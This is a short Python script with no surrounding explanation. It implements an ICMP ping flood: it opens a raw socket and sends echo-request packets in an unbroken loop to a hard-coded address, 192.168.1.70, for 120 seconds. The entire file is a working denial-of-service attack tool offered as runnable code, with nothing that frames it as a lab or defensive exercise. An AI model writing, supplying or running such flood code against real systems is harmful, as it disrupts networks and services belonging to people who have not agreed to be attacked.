import socket
import random
import struct
import sys
import time

def icmp_flood(target_ip, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    timeout = time.time() + duration

    while time.time() < timeout:
        packet = create_icmp_packet()
        sock.sendto(packet, (target_ip, 0))

def create_icmp_packet():
    Header = struct.pack('!BBHHH', 8, 0, 0, 100, 1)
    data = b'ABCDEFGHIJKLMNOPQRSTUVWX'
    cksum = calculate_checksum(Header + data)
    Header = struct.pack('!BBHHH', 8, 0, cksum, 100, 1)
    return Header + data

def calculate_checksum(data):
    checksum = 0
    countTo = (len(data) // 2) * 2

    for count in range(0, countTo, 2):
        thisVal = data[count+1] * 256 + data[count]
        checksum = checksum + thisVal
        checksum = checksum & 0xffffffff

    if countTo < len(data):
        checksum = checksum + data[countTo]
        checksum = checksum & 0xffffffff

    checksum = (checksum >> 16) + (checksum & 0xffff)
    checksum = checksum + (checksum >> 16)
    checksum = ~checksum
    checksum = checksum & 0xffff
    checksum = checksum >> 8 | (checksum << 8 & 0xff00)

    return checksum

if __name__ == '__main__':
    target_ip = '192.168.1.70'
    duration = 120
    icmp_flood(target_ip, duration)